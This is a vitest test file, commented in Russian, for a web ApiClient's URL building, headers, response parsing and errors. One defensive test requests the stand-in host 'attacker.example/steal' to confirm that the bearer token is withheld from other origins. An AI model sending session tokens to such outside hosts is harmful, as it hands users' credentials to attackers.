import { http, HttpResponse } from 'msw';
import { describe, expect, it, vi } from 'vitest';
import { api, API } from '@/test/msw/handlers';
import { server } from '@/test/msw/server';
import { ApiClient } from './ApiClient';
import type { IApiError } from './ApiClient';

function createClient(token: string | null = null) {
  return new ApiClient(API, { getToken: () => token });
}

describe('ApiClient: сборка адреса', () => {
  it('should append the endpoint to the base url', async () => {
    let received = '';
    server.use(
      http.get(api('/chats/abc'), ({ request }) => {
        received = request.url;
        return HttpResponse.json({ ok: true });
      })
    );

    await createClient().get('/chats/abc');

    expect(received).toBe(`${API}/chats/abc`);
  });

  it('should put query parameters into the url and skip empty ones', async () => {
    let received = '';
    server.use(
      http.get(api('/messages/chat-1'), ({ request }) => {
        received = request.url;
        return HttpResponse.json({ messages: [] });
      })
    );

    await createClient().get('/messages/chat-1', {
      limit: 50,
      offset: 0,
      cursor: null,
      search: undefined,
    });

    const url = new URL(received);
    expect(url.searchParams.get('limit')).toBe('50');
    expect(url.searchParams.get('offset')).toBe('0');
    expect(url.searchParams.has('cursor')).toBe(false);
    expect(url.searchParams.has('search')).toBe(false);
  });

  it('does not repeat the base for a path that already starts with it', async () => {
    let received = '';
    server.use(
      http.get(api('/media/file-1'), ({ request }) => {
        received = request.url;
        return HttpResponse.json({ ok: true });
      })
    );

    // Так приходит mediaUrl вложения: '/api/v2/media/<id>'.
    await createClient().get(`${new URL(API).pathname}/media/file-1`);

    expect(received).toBe(`${API}/media/file-1`);
  });

  it('keeps a relative base relative and does not repeat it either', async () => {
    const requested: string[] = [];
    const fetchSpy = vi.spyOn(globalThis, 'fetch').mockImplementation(async (input) => {
      requested.push(String(input));
      return new Response('{}', { headers: { 'content-type': 'application/json' } });
    });

    try {
      const client = new ApiClient('/api/v2');
      await client.get('/api/v2/media/file-1');
      await client.get('/chats/abc');
      // Похожий, но другой путь — не база.
      await client.get('/api/v2x/thing');
    } finally {
      fetchSpy.mockRestore();
    }

    expect(requested).toEqual([
      '/api/v2/media/file-1',
      '/api/v2/chats/abc',
      '/api/v2/api/v2x/thing',
    ]);
  });

  it('should use an absolute endpoint as is', async () => {
    let received = '';
    server.use(
      http.get('https://media.example.com/file.png', ({ request }) => {
        received = request.url;
        return HttpResponse.json({ ok: true });
      })
    );

    await createClient().get('https://media.example.com/file.png');

    expect(received).toBe('https://media.example.com/file.png');
  });
});

describe('ApiClient: заголовки', () => {
  it('should send the bearer token when it is available', async () => {
    let authorization: string | null = null;
    server.use(
      http.get(api('/users/me'), ({ request }) => {
        authorization = request.headers.get('Authorization');
        return HttpResponse.json({ id: 'user-1' });
      })
    );

    await createClient('session-token-abc').get('/users/me');

    expect(authorization).toBe('Bearer session-token-abc');
  });

  // Абсолютный адрес чужого origin — без токена (#871): иначе его увёл бы
  // любой, кто сумел подсунуть клиенту свою ссылку.
  it('does not send the token to another origin', async () => {
    let authorization: string | null = 'не тронуто';
    server.use(
      http.get('https://attacker.example/steal', ({ request }) => {
        authorization = request.headers.get('Authorization');
        return HttpResponse.json({ ok: true });
      })
    );

    await createClient('session-token-abc').get('https://attacker.example/steal');

    expect(authorization).toBeNull();
  });

  it('keeps the token for an absolute address of its own origin', async () => {
    let authorization: string | null = null;
    server.use(
      http.get(api('/users/me'), ({ request }) => {
        authorization = request.headers.get('Authorization');
        return HttpResponse.json({ id: 'user-1' });
      })
    );

    await createClient('session-token-abc').get(api('/users/me'));

    expect(authorization).toBe('Bearer session-token-abc');
  });

  it('should omit authorization without a token', async () => {
    let authorization: string | null = 'не тронуто';
    server.use(
      http.get(api('/users/me'), ({ request }) => {
        authorization = request.headers.get('Authorization');
        return HttpResponse.json({ id: 'user-1' });
      })
    );

    await createClient(null).get('/users/me');

    expect(authorization).toBeNull();
  });

  it('should drop content-type when there is no body', async () => {
    let contentType: string | null = null;
    server.use(
      http.delete(api('/messages/m-1'), ({ request }) => {
        contentType = request.headers.get('Content-Type');
        return HttpResponse.json({ success: true });
      })
    );

    await createClient().delete('/messages/m-1');

    expect(contentType).toBeNull();
  });

  it('should drop content-type when sending FormData', async () => {
    let contentType: string | null = null;
    server.use(
      http.post(api('/media'), ({ request }) => {
        contentType = request.headers.get('Content-Type');
        return HttpResponse.json({ success: true });
      })
    );

    const form = new FormData();
    form.append('file', 'test');
    await createClient().post('/media', form);

    expect(contentType).not.toContain('application/json');
    expect(contentType).toContain('multipart/form-data');
  });

  it('should preserve content-type and serialize valid falsy JSON values', async () => {
    let contentType: string | null = null;
    let receivedBody: unknown = null;
    server.use(
      http.post(api('/settings'), async ({ request }) => {
        contentType = request.headers.get('Content-Type');
        receivedBody = await request.json();
        return HttpResponse.json({ success: true });
      })
    );

    await createClient().post('/settings', false);
    expect(contentType).toBe('application/json');
    expect(receivedBody).toBe(false);

    await createClient().post('/settings', 0);
    expect(contentType).toBe('application/json');
    expect(receivedBody).toBe(0);
  });

  it('should drop content-type and omit body when data is null', async () => {
    let contentType: string | null = 'not-null';
    let rawBody: string | null = null;
    server.use(
      http.post(api('/logout'), async ({ request }) => {
        contentType = request.headers.get('Content-Type');
        rawBody = await request.text();
        return HttpResponse.json({ success: true });
      })
    );

    await createClient().post('/logout', null);
    expect(contentType).toBeNull();
    expect(rawBody).toBe('');
  });
});

describe('ApiClient: разбор ответа', () => {
  it('should return parsed json with status and headers', async () => {
    server.use(
      http.get(api('/chats'), () =>
        HttpResponse.json({ chats: [{ id: 'chat-1' }] }, { status: 200 })
      )
    );

    const response = await createClient().get<{ chats: { id: string }[] }>('/chats');

    expect(response.data.chats).toHaveLength(1);
    expect(response.status).toBe(200);
    expect(response.headers.get('content-type')).toContain('application/json');
  });

  it('should return plain text when the response is not json', async () => {
    server.use(http.get(api('/chats'), () => HttpResponse.text('просто текст')));

    const response = await createClient().get<string>('/chats');

    expect(response.data).toBe('просто текст');
  });
});

describe('ApiClient: ошибки', () => {
  it('should prefer the error field of the payload as a message', async () => {
    server.use(
      http.get(api('/chats'), () =>
        HttpResponse.json({ error: 'чат недоступен', message: 'запасное' }, { status: 400 })
      )
    );

    const failure = await createClient()
      .get('/chats')
      .catch((error: IApiError) => error);

    expect(failure).toBeInstanceOf(Error);
    expect((failure as IApiError).message).toBe('чат недоступен');
    expect((failure as IApiError).status).toBe(400);
    expect((failure as IApiError).data).toEqual({ error: 'чат недоступен', message: 'запасное' });
  });

  it('should fall back to the message field', async () => {
    server.use(
      http.get(api('/chats'), () => HttpResponse.json({ message: 'нет прав' }, { status: 403 }))
    );

    const failure = await createClient()
      .get('/chats')
      .catch((error: IApiError) => error);

    expect((failure as IApiError).message).toBe('нет прав');
  });

  it('should report 401 without depending on the browser event target', async () => {
    // Вне браузера объявить об истёкшей сессии некому: globalThis в Node
    // не EventTarget. Запрос обязан завершиться ошибкой, а не упасть на
    // попытке отправить событие. Само событие проверяется в ApiClient.test.ts.
    server.use(http.get(api('/chats'), () => HttpResponse.json({}, { status: 401 })));

    const failure = await createClient()
      .get('/chats')
      .catch((error: IApiError) => error);

    expect((failure as IApiError).status).toBe(401);
  });
});
